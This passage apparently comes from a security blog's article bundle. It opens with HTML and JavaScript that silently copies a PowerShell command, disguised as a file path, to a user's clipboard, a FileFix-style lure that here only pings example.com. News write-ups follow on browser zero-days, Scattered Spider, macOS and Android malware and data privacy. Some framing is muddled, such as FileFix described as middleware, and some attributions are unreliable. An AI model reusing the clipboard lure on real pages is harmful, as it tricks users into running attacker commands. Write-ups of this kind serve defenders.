    &lt;button id="fileExplorer"&gt;Open File Explorer&lt;/button&gt;

    &lt;div class="footer"&gt;
      &lt;img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft"&gt;
    &lt;/div&gt;
  &lt;/div&gt;

&lt;script&gt;
const fileInput = document.getElementById('fileInput');
const fileExplorer = document.getElementById('fileExplorer');
const path = document.getElementById('path');
path.addEventListener('click', function() {
    navigator.clipboard.writeText("Powershell.exe -c ping example.com # C:\\company\\internal-secure\\filedrive\\tools.pdf");
});
fileExplorer.addEventListener('click', function() {
    navigator.clipboard.writeText("Powershell.exe -c ping example.com # C:\\company\\internal-secure\\filedrive\\Tools.pdf");
    fileInput.click();
});
fileInput.addEventListener('change', () =&gt; {
    alert("Please follow the stated instructions.");
    fileInput.value = "";
    setTimeout(() =&gt; fileInput.click(), 500);
});
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>



    <p><img src="https://ethicalbyte.in/blogs/img/rnd/1.jpg" alt="Illustration of FileFix middleware scanning files" style="width:100%;max-width:800px;margin:20px 0;border-radius:8px;box-shadow:0 0 10px rgba(0,0,0,0.1);"></p><br>
    <p><img src="https://ethicalbyte.in/blogs/img/rnd/2.jpg" alt="Illustration of FileFix middleware scanning files" style="width:100%;max-width:800px;margin:20px 0;border-radius:8px;box-shadow:0 0 10px rgba(0,0,0,0.1);"></p><br>
    <p><img src="https://ethicalbyte.in/blogs/img/rnd/3.jpg" alt="Illustration of FileFix middleware scanning files" style="width:100%;max-width:800px;margin:20px 0;border-radius:8px;box-shadow:0 0 10px rgba(0,0,0,0.1);"></p><br>
    
    <p>A modern replacement doesn’t require a standalone tool—security teams can build or integrate file-processing middleware directly into their web servers or applications. Here’s the core idea:</p>

    <ol>
      <li><strong>Intercept uploads</strong>: Configure your web server or application backend to route every uploaded file through a processing function before it’s saved or shared.</li>
      <li><strong>Scan for hyperlinks</strong>: Use libraries like PyMuPDF for PDFs or python-docx for DOCX files to programmatically extract hyperlinks.</li>
      <li><strong>Rewrite suspicious URLs</strong>: For every detected link, you can:
        <ul>
          <li>Replace it with a safe placeholder like <code>https://warning.local/phishing-link-removed</code>.</li>
          <li>Add visual indicators like “(Link Disabled)” in the document text.</li>
          <li>Remove hyperlinks entirely if they match a denylist of known malicious domains.</li>
        </ul>
      </li>
      <li><strong>Store and serve the sanitized file</strong>: Save the cleaned version of the document and share only this sanitized file with other users.</li>
    </ol>

    <p>This approach allows you to tailor the rules to your organization’s risk tolerance, ensuring that employees or customers aren’t exposed to unexpected phishing links in shared documents.</p>

    <h3>✅ Benefits of Building Your Own FileFix</h3><br>
    <ul>
      <li><strong>Full control over the ruleset</strong> – Customize how aggressive your scanning and rewriting should be.</li>
      <li><strong>No reliance on third-party tools</strong> – Maintain your own codebase, reducing supply chain risk.</li>
      <li><strong>Integration flexibility</strong> – Hook into your existing web application stack, whether it’s Node.js, Python/Django, PHP, or another framework.</li>
      <li><strong>Immediate mitigation</strong> – Uploaded files are cleaned before anyone else can download or view them.</li>
    </ul>

    <h3>⚠️ Important Considerations</h3><br>
    <ul>
      <li><strong>Performance</strong>: Scanning every upload adds processing overhead. Test the impact on upload speeds and server load.</li>
      <li><strong>False positives</strong>: Be careful not to block legitimate URLs unnecessarily—define allowlists for common trusted domains.</li>
      <li><strong>Compliance</strong>: Always ensure that modifying uploaded user content complies with your terms of service and privacy policies.</li>
    </ul>

    <h3>🔚 Conclusion</h3><br>
    <p>Phishing through uploaded files is an often-overlooked attack vector. Although ClickFix is gone, building a custom middleware solution provides a flexible, powerful alternative. By proactively sanitizing file uploads, you can close this security gap and protect your users from malicious links—without relying on outdated or unsupported tools.</p>
  `},{id:"chrome-zero-day-cve-2025-6554-detailed",title:"Google Patches Critical Chrome Zero‑Day CVE‑2025‑6554 – All Users Must Update Now",date:"2025-07-01",author:"Cyber Sentinel",summary:"Google’s emergency update fixes CVE‑2025‑6554, a dangerous zero‑day vulnerability in the Chrome browser’s V8 engine actively exploited in the wild. Learn why this flaw is so critical, how it works, and what steps you must take immediately.",tags:["Chrome","zero-day","browser security","CVE-2025-6554","Google","patch management"],imageKey:"chromeZeroDayExploit",content:`
    <p>On July 1, 2025, Google announced and released an urgent security update for the Chrome web browser, patching CVE‑2025‑6554—a critical zero‑day vulnerability in Chrome’s V8 JavaScript and WebAssembly engine. This vulnerability is already under active exploitation by malicious actors, making it essential for every Chrome user to update immediately.</p>

    <h3>🔎 What is CVE‑2025‑6554 and How Does It Work?</h3><br>
    <p>CVE‑2025‑6554 is a <strong>type confusion flaw</strong> in Chrome’s V8 engine, the core JavaScript and WebAssembly runtime. Type confusion vulnerabilities occur when a program mistakenly assigns a variable of one type as another. In V8, this can enable attackers to manipulate memory outside the intended boundaries of an object, leading to arbitrary code execution.</p>

    <p>Attackers can exploit this by crafting a specially designed website containing malicious JavaScript code. When a user visits such a website, the exploit abuses the vulnerability to execute code on the victim’s system with the same privileges as the browser. This can result in the download of spyware, ransomware, or the establishment of persistent remote access.</p>

    <h3>⚠️ Why CVE‑2025‑6554 is So Dangerous</h3><br>
    <ul>
      <li><strong>Exploitation is already active:</strong> Google confirmed that targeted attacks leveraging this flaw are happening now, not just theoretical proof-of-concepts.</li>
      <li><strong>Drive-by compromise risk:</strong> A single visit to a malicious website can result in compromise without requiring user interaction beyond normal browsing.</li>
      <li><strong>Cross-platform impact:</strong> Because Chrome is used on Windows, macOS, Linux, and forms the core of many Chromium-based browsers, a wide range of users are vulnerable.</li>
      <li><strong>Potential nation-state exploitation:</strong> Experts suggest advanced threat groups may be using this flaw for espionage campaigns against journalists, activists, or enterprises.</li>
    </ul>

    <h3>📜 Context: Chrome’s Zero-Day Track Record in 2025</h3><br>
    <p>This zero-day marks the <strong>fourth actively exploited Chrome vulnerability this year alone</strong>, highlighting a persistent focus by attackers on browser engines as a key attack surface. Earlier 2025 zero-days exploited buffer overflows, type confusion bugs, and sandbox escape techniques—showing consistent interest from cybercriminals and APT groups alike in compromising users directly through web browsing.</p>

    <p>Because browsers are essential gateways to online services, they remain prime targets. Combined with the growing sophistication of exploit kits sold on underground forums, the speed at which zero-days are weaponized continues to accelerate.</p>

    <h3>🛡️ What You Must Do Immediately</h3><br>
    <ol>
      <li><strong>Update Chrome right now:</strong> Ensure your browser is at version 138.0.7204.96 or newer on Windows, macOS, or Linux. Updates can be checked manually by navigating to “Settings > About Chrome.”</li>
      <li><strong>Restart your browser:</strong> Simply updating isn’t enough; Chrome must restart to apply the new security patch.</li>
      <li><strong>Update Chromium-based browsers:</strong> Browsers like Edge, Brave, Opera, and Vivaldi share the V8 engine—these must also be updated promptly to close the same vulnerability.</li>
      <li><strong>Communicate with your organization:</strong> IT teams should push updates across corporate devices and remind employees of the urgent need to patch browsers.</li>
      <li><strong>Harden browsing habits:</strong> Use script-blocking extensions, consider site isolation features in Chrome, and disable unnecessary browser plugins.</li>
    </ol>

    <h3>🔐 How Attackers Are Exploiting CVE‑2025‑6554</h3><br>
    <p>Security researchers discovered the zero-day being delivered through watering-hole attacks—compromising websites known to attract targets, such as industry forums or popular news sites in specific regions. By injecting malicious JavaScript code, attackers silently trigger exploitation chains on visitors’ devices.</p>

    <p>Experts warn that because type confusion exploits can bypass many traditional antivirus solutions (which rely on signatures rather than behavioral detection), only up-to-date browsers or advanced endpoint detection and response (EDR) solutions are likely to catch or block these attacks.</p>

    <h3>📈 Why Browser Zero-Days Are on the Rise</h3><br>
    <p>Browsers like Chrome have become high-value targets because they process untrusted content from the internet in real time. With complex components like JavaScript engines and PDF readers, even a single bug can expose billions of users. Additionally, many organizations have moved critical workflows to web-based platforms, increasing the potential impact of a successful browser exploit.</p>

    <p>The lucrative zero-day market—where brokers can earn six- or seven-figure sums selling working exploits—has incentivized criminal groups and nation-state attackers alike to invest heavily in finding and weaponizing browser vulnerabilities.</p>

    <h3>🛡️ Strengthening Your Browser Security Posture</h3><br>
    <ul>
      <li><strong>Enable automatic updates:</strong> Ensure browsers and extensions update without user intervention.</li>
      <li><strong>Leverage site isolation:</strong> In Chrome, enable “Strict Site Isolation” for an extra layer of defense by running each website in a separate process.</li>
      <li><strong>Use trusted extensions only:</strong> Third-party extensions can introduce their own vulnerabilities or malicious code.</li>
      <li><strong>Adopt DNS-based filtering solutions:</strong> Tools like Secure DNS or enterprise-level DNS filtering can block access to known malicious domains before a browser can connect.</li>
      <li><strong>Monitor web traffic:</strong> Deploy web proxies or next-gen firewalls capable of inspecting SSL traffic for malicious patterns.</li>
    </ul>

    <h3>🔚 Conclusion: Update Now, Stay Vigilant</h3><br>
    <p>Google’s rapid response to CVE‑2025‑6554 shows the importance of timely security patching. But no vendor can act faster than an attacker who already has a zero-day in hand—so staying vigilant, adopting strong security practices, and updating promptly is the best way to reduce risk.</p>

    <p>This isn’t just another security update: the active exploitation means every day you delay updating Chrome or Chromium-based browsers increases your risk of compromise. Take action now to protect your systems, your data, and your privacy.</p>
  `},{id:"scattered-spider-targets-airlines",title:"Airline Industry in the Crosshairs: Scattered Spider Expands Attacks to Qantas and Beyond",date:"2025-07-03",author:"EthicalByte",summary:"The notorious cybercrime group Scattered Spider has expanded its operations from casinos and telecoms to the airline sector, recently breaching systems linked to Qantas, Hawaiian Airlines, and WestJet. Here's everything you need to know.",tags:["airline","scattered spider","qantas","cyberattack","social engineering","mfa","infosec"],imageKey:"scatteredSpiderAirline",content:`
    <h3>✈️ Airlines Are Under Attack</h3><br>
    <p>In July 2025, cybersecurity officials confirmed that the hacking group known as <strong>Scattered Spider</strong> is actively targeting the <strong>airline industry</strong>, marking a dangerous new frontier for one of the world's most critical sectors. What started as a series of attacks against casino chains and tech firms has evolved into a coordinated assault on aviation giants like <strong>Qantas, Hawaiian Airlines, and WestJet</strong>.</p>
    
    <p>While these breaches vary in scope and method, they all rely on the group's signature weapon: <strong>highly targeted social engineering</strong> and <strong>multi-factor authentication (MFA) manipulation</strong>.</p>

    <h3>🕷️ Who Are Scattered Spider?</h3><br>
    <p>Scattered Spider (also known as UNC3944 or Octo Tempest) is a threat actor group composed mostly of teenagers and young adults, fluent in English and technically skilled. They operate under a loosely organized structure and are known for their precision, boldness, and focus on <strong>identity-based attacks</strong>.</p>
    
    <p>Previously, they’ve been linked to major incidents involving MGM Resorts, Caesars Entertainment, and several UK telecom providers. But their recent pivot toward aviation signals a growing ambition — and an increased threat to public infrastructure.</p>

    <h3>🧑‍💻 How They Operate: The Attack Chain</h3><br>
    <p>Scattered Spider doesn’t rely on malware in the traditional sense. Instead, they masterfully exploit human behavior:</p>
    <ol>
      <li><strong>Social Engineering:</strong> Impersonate employees using stolen credentials or fake ID badges</li>
      <li><strong>Help Desk Exploits:</strong> Call IT support to reset MFA or gain access to internal systems</li>
      <li><strong>MFA Fatigue:</strong> Send repeated login requests until users approve them out of annoyance</li>
      <li><strong>Persistence:</strong> Install legitimate remote access tools like AnyDesk or TeamViewer</li>
      <li><strong>Exfiltration:</strong> Access databases, leak files, or encrypt systems for ransom</li>
    </ol>
    <p>They operate with precision, often gathering LinkedIn data or internal IT manuals before striking.</p>

    <h3>🛩️ The Qantas Breach – A Case Study</h3><br>
    <p>Australia’s largest airline, <strong>Qantas</strong>, recently confirmed a data breach affecting nearly 6 million customers. The attackers accessed a third-party call center platform used to manage customer interactions.</p>
    <ul>
      <li>Leaked data includes full names, dates of birth, phone numbers, and frequent flyer numbers</li>
      <li>Qantas stated no passwords, passports, or financial info were compromised</li>
      <li>Security analysts suspect a Scattered Spider-style attack involving help desk impersonation</li>
    </ul>
    <p>This follows similar breaches at <strong>Hawaiian Airlines</strong> and <strong>WestJet</strong>, where attackers reportedly used voice phishing and fake IT personas to gain initial access.</p>

    <h3>🌐 Why the Airline Industry?</h3><br>
    <p>Airlines are attractive targets because:</p>
    <ul>
      <li>They hold massive databases of sensitive customer and travel data</li>
      <li>They rely heavily on third-party vendors with weaker defenses</li>
      <li>Operational delays and reputation damage create strong incentives to pay ransoms</li>
      <li>Call centers and remote workers are common attack vectors</li>
    </ul>
    <p>Additionally, the aviation sector is slow to update legacy systems, giving attackers ample room to move undetected.</p>

    <h3>🔐 What Can Be Done? Defending Against Scattered Spider</h3><br>
    <p>CISA and other global agencies have released urgent guidelines. Here’s what airlines and vendors must do:</p>
    <ul>
      <li><strong>Lock down help desk processes:</strong> Never approve password resets without full identity verification</li>
      <li><strong>Use phishing-resistant MFA:</strong> Like physical security keys (FIDO2)</li>
      <li><strong>Limit remote access:</strong> Disable unused accounts and review RMM tools like AnyDesk regularly</li>
      <li><strong>Segment networks:</strong> So that vendor and staff systems are isolated from core operations</li>
      <li><strong>Run regular simulations:</strong> To train staff on voice phishing and MFA fraud attempts</li>
    </ul>

    <h3>🧠 Final Thoughts</h3><br>
    <p>The airline industry is not just a travel provider — it’s part of national critical infrastructure. A successful cyberattack can disrupt flights, leak data, damage trust, and even pose safety risks.</p>
    <p>With groups like Scattered Spider shifting targets, all major carriers — and even smaller regional airlines — must reevaluate their defenses. Prevention isn’t just about firewalls anymore. It’s about <strong>human awareness, identity protection, and zero-trust design</strong>.</p>

    <blockquote>Social engineering is the real malware. Train your people. Harden your policies. Don’t wait until your runway becomes a breach path.</blockquote>
  `},{id:"chrome-firefox-critical-update-june-2025",title:"Chrome 138 & Firefox 140 Security Updates: What You Need to Know",date:"2025-07-03",author:"EthicalByte",summary:"Google and Mozilla have released critical security updates for Chrome and Firefox, addressing over two dozen vulnerabilities—including high-severity memory flaws capable of remote code execution. This breakdown explains what’s been fixed, who’s at risk, and how to respond.",tags:["Chrome","Firefox","browser security","memory safety","vulnerability patch"],imageKey:"chromeFirefoxUpdate",content:`
    <p>On June 25, 2025, both Google and Mozilla launched major browser updates: <strong>Chrome 138</strong> and <strong>Firefox 140</strong>. These versions address a combined two dozen vulnerabilities—several of which are high-severity memory safety bugs that can lead to remote code execution. While there’s no confirmed active exploitation in the wild, the risk remains very real, and updating is crucial.</p>

    <h3>🔍 Chrome 138: Eleven Security Fixes</h3><br>
    <p>Chrome 138 brings 11 patches, including memory-related vulnerabilities and logic flaws in browser subsystems:</p>
    <ul>
      <li><strong>Use-after-free in Animation:</strong> Can cause memory corruption; a $4,000 bug bounty was awarded.</li>
      <li><strong>Insufficient policy enforcement in Loader:</strong> Potential for bypassing internal security checks.</li>
      <li><strong>Data validation flaw in DevTools:</strong> Could allow developers to leak or manipulate data—$1,000 reward.</li>
      <li>Other medium and low-level issues across V8, UI, and sandbox components.</li>
    </ul>
    <p>Chrome’s patch—versions 138.0.7204.49/50—reinforces key browser boundaries and safeguards memory handling.</p>

    <h3>🔐 Firefox 140: Thirteen Vulnerabilities Sealed</h3><br>
    <p>Released alongside updates for ESR versions 128.12 and 115.25, Firefox 140 includes fixes for 13 security flaws:</p>
    <ul>
      <li><strong>Use-after-free in FontFaceSet:</strong> Potentially exploitable for arbitrary code execution.</li>
      <li><strong>Memory corruption in media decoding:</strong> Enables remote code execution with malicious files.</li>
      <li>Other critical issues include UUID leaks through WebCompat, XSS via DevTools Save As, policy bypass bugs, and Android phishing loopholes.</li>
    </ul>
    <p>These patches close gaps that could be abused by specially crafted media or web sequences.</p>

    <h3>📌 Why These Updates Matter</h3><br>
    <ul>
      <li>Memory safety flaws allow deep control over browser processes—translating to high-risk remote exploits.</li>
      <li>Drive-by attacks using crafted scripts or media offer no-click compromise potential.</li>
      <li>Chrome and Firefox share core engine technologies—parallel vulnerabilities illustrate shared threat surfaces.</li>
    </ul>

    <h3>🛡️ What You Should Do Immediately</h3><br>
    <ol>
      <li><strong>Update Now:</strong>  
        – Chrome users: upgrade to version 138.0.7204.50+  
        – Firefox users: upgrade to version 140 (and ESR users to 128.12 or 115.25)</li>
      <li><strong>Restart Your Browser:</strong> Patches only take effect after a restart.</li>
      <li><strong>Enable Auto-Updates:</strong> Prevent delays in future patch rollouts.</li>
      <li><strong>Extend to All Browsers:</strong> Update Chromium-based alternatives like Edge, Brave, and Opera.</li>
      <li><strong>Deploy in Enterprise:</strong> IT teams should push patched versions across all endpoints quickly.</li>
    </ol>

    <h3>🔍 Broader Security Lessons</h3><br>
    <ul>
      <li>Frequent memory vulnerabilities show browser engines remain a lucrative exploit target.</li>
      <li>Strong update processes and education can block critical attack channels.</li>
      <li>Complement browser hardening with script control, threat detection, and DNS filtering.</li>
    </ul>

    <h3>🔚 Final Takeaway</h3><br>
    <p>These simultaneous updates from Chrome and Firefox emphasize that even widely-used software remains vulnerable—especially as attackers zero in on core browser components. While no active exploits have been confirmed, patching now offers the best defense. Make updating browsers a non-negotiable part of your cyber hygiene routine.</p>
  `},{id:"north-korea-fake-zoom-macos",title:"North Korean Hackers Spread MacOS Malware Using Fake Zoom Updates",date:"2025-07-04",author:"Ethical Byte",summary:"A new campaign by North Korean state-backed hackers targets MacOS users with malware disguised as Zoom updates. Learn how the attack works and how to stay protected.",tags:["north korea","macos","zoom","malware","social engineering","cyberattack"],imageKey:"northKoreaZoomMalware",content:`
    <h3>🎯 The New Threat: Fake Zoom Updates on MacOS</h3><br>
    <p>In July 2025, cybersecurity researchers uncovered a North Korean-sponsored campaign targeting MacOS users by distributing malware disguised as legitimate Zoom application updates. This attack is part of the group’s ongoing espionage operations aimed at stealing sensitive information from individuals and organizations worldwide.</p>

    <h3>👥 Who’s Behind It?</h3><br>
    <p>The attack is attributed to a threat actor known as <strong>Lazarus Group</strong> (also tracked as UNC4034 or APT37), a state-sponsored hacking group linked to North Korea. Lazarus is infamous for its sophisticated espionage campaigns, financial thefts, and disruption operations targeting governments, defense contractors, and researchers.</p>

    <h3>🧪 How the Attack Works</h3><br>
    <p>Researchers explain that the attackers set up fake websites or send phishing emails offering what appears to be a legitimate Zoom installer for MacOS. However, this installer is a Trojan: it installs malware alongside Zoom.</p>
    <ul>
      <li>The malware establishes persistence on the system by installing launch agents</li>
      <li>It opens a backdoor that allows remote command execution</li>
      <li>It can steal files, record keystrokes, and potentially activate webcams or microphones</li>
      <li>It communicates with command-and-control servers to receive additional payloads</li>
    </ul>

    <h3>🚪 Why MacOS?</h3><br>
    <p>Historically, attackers focused on Windows systems, but the rise in MacOS usage, especially among executives, journalists, and creatives, has made it an attractive target. Mac users often feel a false sense of security because malware on MacOS is less common — but this campaign proves that perception is dangerous.</p>

    <h3>🔎 Why Use Zoom as a Lure?</h3><br>
    <p>Zoom has become an indispensable tool for businesses and individuals worldwide, especially post-pandemic. Since users regularly receive prompts to update Zoom, attackers exploit this expectation to trick victims into installing malware without suspicion.</p>

    <h3>🛡️ How to Protect Yourself</h3><br>
    <p>If you’re a Mac user — or manage a fleet of Macs in your organization — here are practical steps to defend against this attack:</p>
    <ul>
      <li>Only download Zoom and other apps from official websites or app stores</li>
      <li>Enable Gatekeeper and System Integrity Protection (SIP) on your Mac</li>
      <li>Regularly check for unknown login items or launch agents in your system settings</li>
      <li>Keep MacOS and all software up-to-date</li>
      <li>Use endpoint security software capable of detecting MacOS malware</li>
    </ul>

    <h3>🌐 Impact on Organizations</h3><br>
    <p>Beyond individual users, this campaign highlights the risk to organizations that use BYOD (bring-your-own-device) policies or allow personal Macs on corporate networks. A single compromised Mac can act as a bridge into sensitive corporate environments.</p>

    <h3>🧠 Final Thoughts</h3><br>
    <p>This incident is another reminder that <strong>MacOS is not immune</strong> to cyber threats. Attackers are creative and adaptive — they’ll exploit whatever platforms and habits make it easiest to breach their targets. Staying informed and cautious about where you download software is your best defense.</p>

    <blockquote>🚫 Don't fall for fake updates. Trust only official sources and question every download prompt.</blockquote>
  `},{id:"google-314m-cellular-data-verdict",title:"Google Ordered to Pay $314M for Misusing Android Users’ Cellular Data",date:"2025-07-05",author:"EthicalByte",summary:"A California jury has awarded $314 million to Android users after finding Google intentionally used cellular data from idle devices without consent. Learn what happened, the implications, and how to protect yourself.",tags:["Google","Android","mobile privacy","data misuse","legal verdict"],imageKey:"googleDataVerdict",content:`
    <p>In a landmark July 2025 verdict, a jury in San Jose, California, ruled that Google must pay over $314 million for using Android users’ cellular data when their devices were idle—without proper consent. The class-action case, representing about 14 million Californians, accused Google of unfair data collection practices that benefited the company while burdening users.</p>

    <h3>📊 What the Jury Decided</h3><br>
    <ul>
      <li>Google used cellular data—even when phones were idle or Wi‑Fi wasn’t enabled—to send and receive device information.</li>
      <li>The jury concluded these transfers were “mandatory and unavoidable,” giving Google an unfair advantage and costing users data from their plans.</li>
      <li>The verdict awards $314.6 million, but Google plans to appeal, arguing these data flows are necessary for Android’s security and performance and are disclosed in user agreements.</li>
    </ul>

    <h3>📱 How the Data Transfers Worked</h3><br>
    <p>These transfers occurred in the background—Android phones periodically sent usage logs, network statuses, and app activity to Google servers, regardless of user settings. One test found an idle device using nearly 9 MB of cellular data daily, predominantly communicating with Google even when stationary and unused.</p>

    <h3>🔍 Why This Verdict Matters</h3><br>
    <ul>
      <li><strong>Consumer rights spotlighted:</strong> The ruling reinforces that background data usage requires clear user consent—especially when not tied to Wi‑Fi.</li>
      <li><strong>Standard for tech accountability:</strong> This class-action may influence upcoming trials involving all other U.S. states in April 2026.</li>
      <li><strong>Privacy vs. convenience:</strong> The case highlights tensions between seamless device functionality and user control over data.</li>
    </ul>

    <h3>🛡️ How to Take Control of Your Data</h3><br>
    <ol>
      <li><strong>Monitor cellular usage:</strong> Regularly check your data meter for unexplained background consumption.</li>
      <li><strong>Adjust background settings:</strong> Disable background data for apps and enable “Wi‑Fi only” options in settings.</li>
      <li><strong>Review permissions:</strong> Audit apps accessing device logs or statuses and revoke unnecessary permissions.</li>
      <li><strong>Use data-saving tools:</strong> Employ built-in OS features or third-party apps that restrict idle background transfers.</li>
      <li><strong>Stay informed:</strong> Monitor court outcomes—especially the upcoming trial covering the other U.S. states.</li>
    </ol>

    <h3>⚖️ Google’s Response & What’s Next</h3><br>
    <p>Google contends that these processes support critical system operations—such as performance tuning, security monitoring, and diagnostics—and are disclosed in user agreements. The company will appeal the verdict, claiming the jury misunderstood these essential functions.</p>
    <p>Meanwhile, a broader national class-action is scheduled for April 2026. Should that case mirror California’s decision, the financial and regulatory impact on Google could increase significantly.</p>

    <h3>🔚 Final Takeaway</h3><br>
    <p>This verdict sends a powerful message: users deserve transparency and control over background data usage. Whether or not Google overturns the decision, it's a reminder to take charge of your data privacy—by monitoring usage, adjusting settings, and questioning what runs behind the scenes on your devices.</p>
  `},{id:"taiwan-chinese-apps-data-security",title:"Taiwan Flags Chinese Apps Over Data Security Risks Amid Rising Tensions",date:"2025-07-05",author:"Ethical Byte",summary:"Taiwanese authorities have issued a stern warning about Chinese-developed mobile apps, citing national security and personal privacy concerns. Here’s a comprehensive look at what’s happening and how to protect yourself.",tags:["taiwan","china","mobile security","data privacy","cybersecurity","apps"],imageKey:"taiwanChineseApps",content:`
    <h3>📱 Taiwan Steps Up Against Chinese Apps</h3><br>
    <p>In a move that underscores rising geopolitical and cybersecurity concerns, Taiwan’s National Communications Commission (NCC) and the Ministry of Digital Affairs have jointly warned citizens and businesses about installing and using Chinese-developed apps on their devices. Authorities point to serious risks — ranging from <strong>data harvesting</strong> to potential <strong>espionage</strong> — associated with these apps.</p>

    <h3>🌏 Why Now?</h3><br>
    <p>This warning comes amid heightened tensions across the Taiwan Strait and after several investigations revealed that popular Chinese apps were collecting and transmitting user data back to servers under Beijing’s jurisdiction. Officials described these apps as a possible gateway for surveillance and influence operations aimed at undermining Taiwan’s security and sovereignty.</p>

    <h3>🕵️ How Chinese Apps Collect Your Data</h3><br>
    <p>According to Taiwanese authorities and cybersecurity researchers, many Chinese apps:</p>
    <ul>
      <li>Request broad permissions — including access to camera, microphone, contacts, and location — even when not needed for app functionality</li>
      <li>Send collected data to servers in mainland China, often encrypted and out of reach of Taiwanese (or international) oversight</li>
      <li>Use complex, obfuscated code to mask their true behavior and evade detection</li>
      <li>Continue to track users even after uninstallation, thanks to hidden background services or browser-based trackers</li>
    </ul>

    <h3>⚖️ From Personal Privacy to National Security</h3><br>
    <p>While much of the focus is on personal data privacy, Taiwanese officials stress that these risks extend far beyond individuals. If sensitive devices belonging to government officials, military personnel, or critical infrastructure operators are compromised through such apps, the consequences could include espionage, sabotage, or manipulation of public opinion.</p>

    <p>This is consistent with findings from the U.S., India, and several EU nations, which have similarly restricted or banned Chinese apps in recent years.</p>

    <h3>🚨 Examples of At-Risk Apps</h3><br>
    <p>Although the advisory does not provide an exhaustive list, previous bans in other countries included these widely-used apps:</p>
    <ul>
      <li><strong>TikTok</strong> — for alleged data sharing with Chinese authorities</li>
      <li><strong>WeChat</strong> — for pervasive surveillance capabilities</li>
      <li><strong>QQ</strong> — for questionable encryption and data handling</li>
      <li><strong>CamScanner</strong> — previously found embedding malware in its code</li>
      <li><strong>UC Browser</strong> — for insecure data transmission practices</li>
    </ul>

    <h3>📊 The Bigger Picture: Data Sovereignty</h3><br>
    <p>This move also reflects Taiwan’s broader efforts to assert its <strong>digital sovereignty</strong> and protect its citizens’ data from falling into the hands of foreign powers. In a world where information equals power, letting sensitive data slip beyond your borders can have profound consequences — economically, politically, and even militarily.</p>

    <h3>🛡️ How You Can Protect Yourself</h3><br>
    <p>Here are actionable steps you can take to safeguard your data and reduce risk from questionable apps:</p>
    <ul>
      <li>📲 Download apps only from trusted developers and official app stores</li>
      <li>🔒 Review app permissions — revoke anything unnecessary (e.g., why does a flashlight app need your contacts?)</li>
      <li>🚫 Delete apps you no longer use or don’t trust</li>
      <li>🛡️ Use a mobile security suite capable of detecting privacy-invasive behavior</li>
      <li>🌐 Consider using a VPN to obscure your network traffic</li>
      <li>🔄 Keep your operating system and apps updated to close known vulnerabilities</li>
    </ul>

    <h3>🧠 Final Thoughts</h3><br>
    <p>As mobile apps become an integral part of daily life, it’s easy to overlook how much access we grant them — and by extension, their developers. Taiwan’s warning is not just about geopolitics; it’s a reminder that <strong>your privacy is your responsibility</strong>.</p>

    <p>Always ask yourself: who owns this app, where is my data going, and what would happen if it fell into the wrong hands?</p>

    <blockquote>📌 When it comes to apps and your data: trust is good — verification is better.</blockquote>
  `},{id:"catwatchful-android-spyware-leak",title:"Catwatchful Android Spyware Exposes 62,000 User Accounts in Massive Data Leak",date:"2025-07-06",author:"Ethical Byte",summary:"Cybersecurity researchers uncovered a sophisticated spyware campaign targeting Android devices, leaking sensitive data from over 62,000 victims. Learn how Catwatchful works, why it’s dangerous, and how to protect yourself.",tags:["android","spyware","catwatchful","data leak","mobile security","credential theft"],imageKey:"catwatchfulSpyware",content:`
    <h3>🐾 A Silent Predator: What Is Catwatchful?</h3><br>
    <p>In July 2025, researchers at Gbhackers uncovered a large-scale Android spyware campaign dubbed <strong>Catwatchful</strong>, responsible for stealing and leaking personal data from at least <strong>62,000 users worldwide</strong>. This malware has operated largely undetected for months, quietly siphoning data from victims' devices to an attacker-controlled server.</p>

    <p>Unlike simple adware or scams, Catwatchful is a <strong>persistent, highly invasive spyware</strong> that masquerades as legitimate apps and silently takes over the device.</p>

    <h3>📰 What Did Researchers Find?</h3><br>
    <p>The campaign came to light when cybersecurity teams discovered an <strong>unprotected server</strong> operated by the attackers, hosting an enormous trove of stolen credentials, call logs, messages, location data, and more. Researchers were able to analyze the leaked data and map the full scope of the campaign — which had already compromised tens of thousands of Android devices.</p>

    <p>The name <em>Catwatchful</em> comes from its stealthy, watchful behavior — quietly observing victims while keeping itself hidden from detection.</p>

    <h3>🎭 How Does Catwatchful Infect Devices?</h3><br>
    <p>The spyware is usually distributed as <strong>fake apps</strong> — often utilities, games, or social tools — that users download outside of the official Google Play Store. In particular, attackers rely on:</p>
    <ul>
      <li>Untrusted APK download sites and forums</li>
      <li>Malicious ads prompting users to “update” or “optimize” their phone</li>
      <li>Phishing SMS messages with malicious APK download links</li>
      <li>Social engineering tactics that promise exclusive content or discounts</li>
    </ul>

    <p>Once installed, the app requests a long list of permissions, including admin rights, making it very difficult to remove. Even after rebooting, the spyware remains active — recording data and transmitting it back to the attackers.</p>

    <h3>🔍 What Kind of Data Does It Steal?</h3><br>
    <p>Catwatchful is designed to harvest <strong>as much personal and sensitive information as possible</strong>. This includes:</p>
    <ul>
      <li>👤 Usernames, passwords, and saved login credentials</li>
      <li>📞 Call history, contact lists, and ongoing call recordings</li>
      <li>💬 SMS and instant messaging conversations</li>
      <li>📷 Photos, videos, and voice recordings</li>
      <li>🌍 GPS coordinates, movement patterns, and location history</li>
      <li>📱 Device information like IMEI, model, and network details</li>
    </ul>

    <p>The stolen data can be sold on dark web marketplaces, used for identity theft, or even exploited in targeted extortion campaigns.</p>

    <h3>🚨 Why Is This Campaign Alarming?</h3><br>
    <p>Catwatchful is notable for its:</p>
    <ul>
      <li>🌐 Global reach — affecting victims in dozens of countries</li>
      <li>📈 Scale — over 62,000 compromised accounts and growing</li>
      <li>🤐 Stealth — hiding in plain sight and avoiding detection by many antivirus tools</li>
      <li>💻 Attacker sloppiness — leaving the stolen data on an unsecured server, enabling discovery</li>
    </ul>

    <p>This shows not only how effective social engineering and sideloading attacks still are, but also how carelessly some attackers handle stolen data once collected.</p>

    <h3>🛡️ How You Can Stay Safe</h3><br>
    <p>Here’s how to defend yourself against Catwatchful and similar spyware campaigns:</p>
    <ul>
      <li>✅ Never download APKs from untrusted or unofficial sources</li>
      <li>✅ Enable Google Play Protect and use a reputable mobile security app</li>
      <li>✅ Review app permissions after installation — revoke unnecessary access</li>
      <li>✅ Don’t grant admin rights to apps you don’t fully trust</li>
      <li>✅ Keep your Android OS and apps updated with security patches</li>
      <li>✅ Regularly audit your device for suspicious apps or high data usage</li>
      <li>✅ Change passwords if you suspect compromise and enable multi-factor authentication (MFA)</li>
    </ul>

    <h3>🌟 Lessons for the Future</h3><br>
